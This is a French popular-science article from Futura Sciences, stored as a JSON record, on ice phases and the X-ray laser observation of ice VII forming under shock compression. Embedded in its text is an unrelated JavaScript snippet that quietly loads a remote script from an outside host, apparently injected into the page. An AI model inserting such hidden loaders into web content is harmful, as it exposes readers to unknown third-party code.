{"title": "Glaces extraterrestres, les secrets de leur formation decouverts", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-07-22", "content": "Notre univers ne renferme pas uniquement de la glace ordinaire. Il existe par exemple une glace extraterrestre appelee << glace VII >>. Pour la premiere fois, la formation de celle-ci a haute pression vient d'etre observee avec un laser a rayons X. Ce qu'il faut retenir Les experiences de la physique des hautes pressions menees depuis le debut du XX e  siecle ont revele l'existence de plusieurs phases de glaces solides. Certaines de ces glaces doivent exister sur d'autres planetes, dans le Systeme solaire ou plus loin encore. Une nouvelle technique permet de percer les secrets de la genese de ces glaces en observant les details de leur formation avec des rayons X. Le premier succes a ete obtenu avec la glace VII. Comprendre l'origine de ces glaces va nous aider a comprendre celle des corps celestes glaces, y compris quand il s'agit de l'interieur d'exoplanetes. C'est relativement peu connu (sauf des physiciens et chimistes confrontes au sujet), mais il y a, dans le cosmos, plusieurs types de glaces. Celles-ci apparaissent dans differentes phases selon les conditions de temperature et de pression. Nous en connaissons plus d'une dizaine de  formes cristallines . La premiere glace decouverte par l'humanite, celle des  glaciers  et de la neige, a ete classifiee au debut du XX e  siecle par Gustav Tammann, sous l'appellation de << glace Ih >> (la lettre << h >> indique qu'elle fait partie des cristaux dont la  maille cristalline  est hexagonale). Tammann a aussi decouvert les glaces de types II et III. Pionnier de la  physique  des hautes pressions, le physicien  P. W. Bridgman  a contribue a l'extension de notre connaissance des types de glaces en fabriquant, en 1912 d'abord, les glaces V et VI, puis, en 1937, la glace VII. Ces connaissances nous permettent de speculer sur la structure interne des  planetes geantes  comme  Jupiter  et  Neptune  mais aussi, maintenant, sur l'interieur de certaines  exoplanetes , en particulier les grandes  planetes oceans . Ce diagramme de phases de l'eau montre bien qu'il existe plusieurs types de glaces possibles. (c) Wikipedia, Olivier Descout, CC by-sa 3.0                               Comment l'eau liquide se transforme-t-elle en glace extraterrestre ? Ces decouvertes sur les phases de la glace sont donc presque centenaires mais l'on aurait tort de croire que l'Homme sait desormais tout a leur sujet. Et pour cause : meme aujourd'hui, l'eau  liquide  continue de nous surprendre. Nous l'avons vu recemment avec des travaux ayant montre qu'elle etait en realite un melange complexe de  deux phases liquides .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les recherches concernant les differents types de glaces se poursuivent donc, notamment parce qu'elles devraient nous permettre de mieux comprendre la structure et la  genese des corps celestes glaces  du  Systeme solaire  (comme  Europe ), mais aussi parce qu'elles pourraient avoir des  applications  technologiques imprevues. Un type de glace baptise << glace XVI >> est par exemple susceptible de nous aider a mieux comprendre les immenses  gisements  d'hydrate de methane situes au fond des oceans. Or, si nous pouvions efficacement faire de la capture de CO 2  pour supprimer son injection dans l' atmosphere  en continuant a consommer des  energies fossiles , ces gisements pourraient nous servir a relever les defis de la deuxieme moitie du XXI e  siecle. Recemment, des chercheurs etats-uniens ont publie un article dans  Physical Review Letter s . L'objectif de leurs travaux : comprendre comment l'eau liquide peut se transformer en glaces extraterrestres comme celles que l'on doit rencontrer a hautes pressions (aussi bien lorsque des  cometes  entrent en collision qu'a grandes profondeurs dans les exoplanetes oceans). Les physiciens ont pu suivre en detail, pour la premiere fois, et a l'echelle microscopique, comment les  molecules  d'eau s'organisent une a une pour passer d'une phase desordonnee et liquide a une phase  solide  et ordonnee appelee << glace VII >>. Une couche d'eau circulaire intercalee entre une plaquette de diamant revetue d'or et une plaquette de quartz. La couche d'eau se transforme en glace VII apres avoir ete bombardee par un laser intense. (c) Arianna Gleason                               La glace VII passee aux rayons X La performance est d'autant plus spectaculaire que le changement de phase s'est produit en quelques milliardiemes de seconde. Pour obtenir ce changement, les chercheurs ont utilise une technique a la base des experiences de  fusion controlee dite inertielle  et qui permet d'atteindre rapidement de tres hautes pressions. Ils ont ainsi commence par placer un echantillon d'eau entre deux plaquettes, dont une etait constituee de  diamant . En bombardant cette derniere avec un  flash laser , une partie de sa  matiere  s'est vaporisee et, tout en quittant la  plaquette , elle a exerce sur elle une pression de plus de 50.000 atmospheres, comme si on avait allume sur elle un petit moteur-fusee. Simultanement, un faisceau de  rayons X  intense produit par un  laser a electrons libres  (le plus puissant du monde et qui equipe le laboratoire  Linac Coherent Light Source , a Stanford) est passe a travers les plaquettes et l'echantillon d'eau, permettant de reveler l'evolution de l'ordre microscopique par  diffraction  (une methode au coeur des progres fulgurants de la  cristallographie  depuis un siecle). L'equivalent de plusieurs  photographies  montrant l'apparition d'une structure a base de molecules d'eau a ainsi ete pris pendant une  duree  d'environ 6 milliardiemes de seconde a l'aide d'une serie de flashs en rayons X qui duraient eux-memes une  femtoseconde , c'est-a-dire un millionieme de milliardieme de seconde. L'un des resultats obtenus fut surprenant. Alors que la theorie prevoyait que les molecules d'eau allaient s'assembler en donnant des structures en forme de spheres, ce sont des structures en forme de barreaux qui ont ete obtenues. Une fois de plus, la nature nous prouve que nous ne sommes pas au bout de nos surprises avec l'eau. Nous disposons en tout cas desormais d'un nouvel outil pour percer les secrets des differentes formes de glaces qui peuvent etre rencontrees en dehors de la  Terre  et meme du Systeme solaire. ", "theme": "sciences"}